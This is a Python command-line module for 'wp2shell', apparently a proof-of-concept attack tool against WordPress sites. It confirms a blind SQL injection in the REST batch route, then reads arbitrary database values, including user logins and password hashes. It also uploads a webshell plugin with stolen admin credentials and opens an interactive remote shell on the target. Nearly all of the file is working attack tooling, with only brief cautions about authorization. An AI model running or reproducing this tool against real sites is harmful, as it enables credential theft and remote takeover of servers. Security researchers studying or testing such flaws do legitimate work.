"""Command-line interface."""

from __future__ import annotations

import argparse
import shlex
import sys
from typing import Optional

from . import __version__
from .client import BatchClient
from .shell import AdminSession
from .sqli import BlindSQLi
from .version import public_version_hints, version_status

try:
    import readline  # noqa: F401 - enables line editing/history for the interactive prompt
except ImportError:
    pass

_TTY = sys.stdout.isatty()


def _paint(code: str, text: str) -> str:
    return f"\033[{code}m{text}\033[0m" if _TTY else text


def info(msg: str) -> None:
    print(f"[*] {msg}")


def good(msg: str) -> None:
    print(_paint("32", f"[+] {msg}"))


def bad(msg: str) -> None:
    print(_paint("31", f"[-] {msg}"))


def warn(msg: str) -> None:
    print(_paint("33", f"[!] {msg}"))


def _progress(text: str) -> None:
    # Single updating line on a terminal; suppressed when output is piped or redirected.
    if _TTY:
        sys.stdout.write("\r\033[K    " + text)
        sys.stdout.flush()


def _clear_progress() -> None:
    if _TTY:
        sys.stdout.write("\r\033[K")
        sys.stdout.flush()


def _client(args: argparse.Namespace) -> BatchClient:
    return BatchClient(
        args.url,
        timeout=args.timeout,
        rest_route=args.rest_route,
        proxy=args.proxy,
    )


def _short(text: str, *, limit: int = 96) -> str:
    if len(text) <= limit:
        return text
    return text[: limit - 3] + "..."


def _print_version_hints(client: BatchClient) -> None:
    hints = public_version_hints(client)
    if not hints:
        warn("No public WordPress version hints found.")
        return

    info("Public WordPress version hints:")
    for hint in hints:
        print(
            f"    - {hint.version} via {hint.source} "
            f"({version_status(hint.version)}) - {_short(hint.detail)}"
        )
    if any(hint.affected for hint in hints):
        warn("A public version hint falls in the wp2shell affected range; verify internally or confirm with authorization.")


# -- commands ---------------------------------------------------------------


def cmd_check(args: argparse.Namespace) -> int:
    # The confirmation request sleeps for --sleep, so the timeout must exceed it.
    client = BatchClient(
        args.url,
        timeout=max(args.timeout, args.sleep + 10),
        rest_route=args.rest_route,
        proxy=args.proxy,
    )
    probe = client.probe()
    if probe.status != 207:
        bad(f"Batch endpoint returned HTTP {probe.status} (not 207) — patched or REST API disabled.")
        _print_version_hints(client)
        return 1
    good("Batch endpoint reachable and unauthenticated (HTTP 207).")

    result = BlindSQLi(client, sleep=args.sleep).confirm_timing(samples=args.samples)
    if args.samples > 1:
        details = ", ".join(
            f"{base:.2f}s->{delay:.2f}s" for base, delay in result.samples
        )
        info(f"Timing samples: {details}")
        info(f"Median delta {result.delta:.2f}s; threshold {result.threshold:.2f}s.")
    if result.confirmed:
        good(f"VULNERABLE — baseline {result.baseline:.2f}s, injected {result.delayed:.2f}s.")
        _print_version_hints(client)
        return 0
    bad(f"Not vulnerable — baseline {result.baseline:.2f}s, injected {result.delayed:.2f}s.")
    _print_version_hints(client)
    return 2


def cmd_read(args: argparse.Namespace) -> int:
    client = _client(args)
    sqli = BlindSQLi(client)

    if args.query:
        info(f"Reading: {args.query}")
        value = sqli.extract(args.query, max_length=args.max_length, on_char=_progress)
        _clear_progress()
        good(f"Result: {value}")
    elif args.preset == "fingerprint":
        for label, expr in (
            ("MySQL version", "SELECT @@version"),
            ("Database user", "SELECT CURRENT_USER()"),
            ("Database name", "SELECT DATABASE()"),
        ):
            good(f"{label}: {sqli.extract(expr, max_length=args.max_length)}")
    elif args.preset == "users":
        table = f"{args.prefix}users"
        total = sqli.integer(f"SELECT COUNT(*) FROM {table}")
        info(f"{total} user(s) in {table}.")
        for offset in range(total):
            row = sqli.extract(
                f"SELECT CONCAT_WS(0x7c, ID, user_login, user_pass) "
                f"FROM {table} ORDER BY ID LIMIT {offset},1",
                max_length=args.max_length,
                on_char=_progress,
            )
            _clear_progress()
            good(row)

    info(f"{sqli.requests} request(s) sent.")
    return 0


_CWD_MARK = "__wp2shellcwd__"  # shell-metacharacter-free so it survives the remote shell


def _repl(session: AdminSession, path: str) -> None:
    """A minimal interactive prompt piping each line through the webshell.

    Commands are stateless server-side, so the working directory is tracked client-side and
    re-applied to each command (which makes `cd` behave as expected).
    """
    pwd = session.run(path, "pwd")
    if pwd is None:
        bad("webshell not responding; aborting interactive mode.")
        return
    cwd = pwd.strip() or "/"
    info("Interactive shell — type commands, 'exit' or Ctrl-D to quit.")
    while True:
        try:
            line = input(_paint("36", f"{cwd} $ "))
        except (EOFError, KeyboardInterrupt):
            print()
            return
        command = line.strip()
        if not command:
            continue
        if command in ("exit", "quit"):
            return
        out = session.run(
            path, f"cd {shlex.quote(cwd)} 2>/dev/null; {command}; printf '{_CWD_MARK}%s' \"$(pwd)\""
        )
        if out is None:
            bad("no response from webshell")
            continue
        body, marker, tail = out.rpartition(_CWD_MARK)
        if marker:
            cwd = tail.strip() or cwd
            out = body
        out = out.rstrip("\n")
        if out:
            print(out)


def cmd_shell(args: argparse.Namespace) -> int:
    if not args.cmd and not args.interactive:
        bad("specify --cmd or --interactive")
        return 2

    warn("This uploads a plugin containing a webshell to the target.")
    session = AdminSession(args.url, timeout=args.timeout, proxy=args.proxy)

    info(f"Authenticating as {args.user!r}...")
    if not session.login(args.user, args.password):
        bad("Login failed. Supply valid admin credentials (crack the hash recovered by 'read').")
        return 1
    good("Authenticated.")

    info("Deploying webshell plugin...")
    path = session.deploy_webshell()
    good(f"Webshell: {args.url.rstrip('/')}{path}")

    rc = 0
    try:
        if args.cmd:
            output = session.run(path, args.cmd)
            if output is None:
                bad("No output — the upload likely failed (nonce/permissions) or the plugin is not web-served.")
                rc = 1
            else:
                print()
                print(output.rstrip("\n"))
                print()

        if args.interactive:
            _repl(session, path)
    finally:
        if args.cleanup:
            info("Cleaning up webshell...")
            try:
                removed = session.cleanup(path)
            except Exception as exc:  # noqa: BLE001 - cleanup must not hide the original failure
                bad(f"Cleanup failed ({exc}) — remove the plugin manually ({path}).")
                rc = 1
            else:
                if removed:
                    good("Webshell removed from the target.")
                else:
                    bad(f"Cleanup failed — remove the plugin manually ({path}).")
                    rc = 1
        elif not args.keep:
            warn(f"Remove the webshell when finished (delete {path} on the target).")
    return rc


# -- parser -----------------------------------------------------------------


def _add_common(parser: argparse.ArgumentParser, *, rest_route: bool = True) -> None:
    parser.add_argument("url", help="target base URL, e.g. http://target")
    if rest_route:
        parser.add_argument(
            "--rest-route",
            action="store_true",
            help="use /?rest_route=/batch/v1 instead of /wp-json/batch/v1",
        )
    parser.add_argument("--timeout", type=float, default=30.0, help="request timeout (default: 30)")
    parser.add_argument("--proxy", help="HTTP proxy, e.g. http://127.0.0.1:8080")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="wp2shell",
        description="WordPress REST batch route-confusion SQLi PoC associated with wp2shell.",
    )
    parser.add_argument("--version", action="version", version=f"wp2shell {__version__}")
    sub = parser.add_subparsers(dest="command", required=True)

    check = sub.add_parser("check", help="safely confirm the vulnerability (non-destructive)")
    _add_common(check)
    check.add_argument("--sleep", type=float, default=3.0, help="confirmation delay (default: 3)")
    check.add_argument(
        "--samples",
        type=int,
        default=3,
        help="baseline/delayed timing pairs for confirmation (default: 3)",
    )
    check.set_defaults(func=cmd_check)

    read = sub.add_parser("read", help="read from the database via blind SQL injection")
    _add_common(read)
    group = read.add_mutually_exclusive_group()
    group.add_argument(
        "--preset",
        choices=("fingerprint", "users"),
        default="fingerprint",
        help="fingerprint (version/user/db) or users (logins and password hashes)",
    )
    group.add_argument("--query", help='scalar SQL expression to read, e.g. "SELECT @@version"')
    read.add_argument("--prefix", default="wp_", help="database table prefix (default: wp_)")
    read.add_argument("--max-length", type=int, default=128, help="max characters per value")
    read.set_defaults(func=cmd_read)

    shell = sub.add_parser("shell", help="post-auth plugin webshell helper")
    _add_common(shell, rest_route=False)  # shell uses wp-login/wp-admin directly, not the REST API
    shell.add_argument("--user", required=True, help="admin username")
    shell.add_argument("--password", required=True, help="admin password (cracked from the hash)")
    shell.add_argument("--cmd", help="command to run on the target (omit when using --interactive)")
    shell.add_argument("-i", "--interactive", action="store_true",
                       help="open an interactive shell after deploying")
    retention = shell.add_mutually_exclusive_group()
    retention.add_argument("--keep", action="store_true",
                           help="do not warn about removing the webshell")
    retention.add_argument("--cleanup", action="store_true",
                           help="delete the webshell from the target when finished")
    shell.set_defaults(func=cmd_shell)

    return parser


def main(argv: Optional[list] = None) -> int:
    args = build_parser().parse_args(argv)
    try:
        return args.func(args)
    except KeyboardInterrupt:
        return 130
    except Exception as exc:  # noqa: BLE001 - surface a clean message, not a traceback
        bad(str(exc))
        return 1
